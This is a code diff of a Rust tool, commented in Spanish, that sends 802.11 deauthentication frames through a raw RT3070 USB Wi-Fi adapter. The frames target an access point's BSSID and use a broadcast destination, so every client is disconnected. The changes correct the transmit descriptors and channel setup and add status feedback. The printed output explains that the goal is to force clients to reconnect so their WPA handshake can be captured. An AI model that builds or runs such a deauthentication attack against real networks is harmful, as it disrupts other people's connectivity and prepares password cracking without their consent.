@@ -1,4 +1,4 @@
-// TX de deauth dirigido por USB crudo (EP 0x01) — igual formato que tx.rs
+// TX de deauth dirigido por USB crudo (EP 0x01) — mismo formato que tx.rs
 // (TXINFO + TXWI + 802.11) pero con frame deauth (subtype 12) al objetivo.
 // Uso: rt3070_deauth <BSSID> [canal] [count] [MAC origen (opcional)]
 // Requiere rt3070_init previo (firmware + radio ON + canal).
@@ -30,7 +30,7 @@ fn main() {
 
     let h = open_rt3070().expect("abrir RT3070 (usa rt3070_init antes)");
 
-    // MAC/BSSID del transmisor (igual que tx.rs)
+    // MAC/BSSID del transmisor (direcciones corregidas)
     let dw0: u32 = u32::from_le_bytes(src[0..4].try_into().unwrap());
     let dw1: u32 = 0x0000_0000 | (src[4] as u32) | ((src[5] as u32) << 8);
     reg_write(&h, MAC_ADDR_DW0, dw0).unwrap();
@@ -38,8 +38,11 @@ fn main() {
     reg_write(&h, MAC_BSSID_DW0, dw0).unwrap();
     reg_write(&h, MAC_BSSID_DW1, dw1).unwrap();
 
-    // Frame deauth: subtype 12 (0xC0), motivo 3 (deauthenticated because sending STA is leaving)
-    // 802.11 mgmt: FC | dur | DA(cliente=broadcast para deauth masiva o BSSID) | SA | BSSID | seq
+    // Reconfigurar canal (RF real) + PA
+    if let Err(e) = config_channel_rt3070(&h, chan) { println!("⚠️ canal: {e:?}"); }
+    let _ = enable_tx_pa(&h);
+
+    // Frame deauth: subtype 12 (0xC0), motivo 3 (sending STA is leaving).
     // Deauth del AP a todos sus clientes: DA=broadcast, SA=BSSID, BSSID=BSSID
     let mut f = Vec::new();
     f.extend_from_slice(&[0xC0, 0x00]); // FC: mgmt, subtype 12 (deauth)
@@ -50,15 +53,11 @@ fn main() {
     f.extend_from_slice(&[0x00, 0x00]); // seq
     f.extend_from_slice(&[0x03, 0x00]); // reason code 3 (leaving)
 
-    // TXWI (CCK 1Mbps, len en bits 16-27) — igual que tx.rs
-    let wifi_len = f.len() as u16;
-    let mut txwi = [0u8; 20];
-    let w0: u32 = (wifi_len as u32) << 16;
-    txwi[0..4].copy_from_slice(&w0.to_le_bytes());
-
-    // TXINFO: USB_DMA_TX_PKT_LEN (TXWI+802.11), WIV=1, QSEL=2
+    // TXWI real (CCK 1Mbps, len en TXWI_W1, PACKETID=1 → feedback TX_STA_FIFO)
+    let txwi = txwi_bytes(f.len() as u16, false, 1);
     let total = (4 + 20 + f.len()) as u16;
-    let info_w0: u32 = ((total as u32 - 4) & 0xFFFF) | (1 << 30) | (2 << 26);
+    // TXINFO igual que tx.rs: PKT_LEN | WIV | QSEL=2
+    let info_w0: u32 = ((total as u32) & 0xFFFF) | (1 << 24) | (2 << 25);
     let mut txinfo = [0u8; 4];
     txinfo[0..4].copy_from_slice(&info_w0.to_le_bytes());
 
@@ -66,13 +65,13 @@ fn main() {
     frame.extend_from_slice(&txinfo);
     frame.extend_from_slice(&txwi);
     frame.extend_from_slice(&f);
-    frame.extend_from_slice(&[0u8; 4]); // USB end pad
+    while frame.len() % 4 != 0 { frame.push(0); } // USB end pad
 
-    println!("Deauth BSSID={} canal={} x{} (frame {} B, TX {} B)", 
+    println!("Deauth BSSID={} canal={} x{} (frame {} B, TX {} B)",
         bssid.map(|b| format!("{b:02X}")).join(":"), chan, count, f.len(), frame.len());
 
-    // USB DMA config (igual que tx.rs)
-    let _ = reg_write(&h, USB_DMA_CFG, 0x0000_009C | (1 << 29) | (1 << 28));
+    // USB DMA config con campos reales del driver
+    let _ = reg_write(&h, USB_DMA_CFG, USB_DMA_CFG_VALUE);
     std::thread::sleep(std::time::Duration::from_millis(10));
 
     const EP_TX: u8 = 0x01;
@@ -90,9 +89,14 @@ fn main() {
         }
         std::thread::sleep(std::time::Duration::from_millis(20)); // ritmo de aire real
     }
+    // Feedback real del chip: cada frame con PACKETID≠0 deja TXDONE en la FIFO
+    for line in drain_tx_status(&h, 16) {
+        println!("  [status] {line}");
+    }
     println!("\n{ok}/{count} deauth frames escritos al chip");
     if ok > 0 {
         println!("➡️  Verifica: la captura Npcap (otro driver, otra tarjeta o Kali) debería");
         println!("   mostrar EAPOL: el cliente se reconecta → handshake capturable.");
+        println!("   (Las líneas [status] TXDONE success=true confirman TX real)");
     }
 }
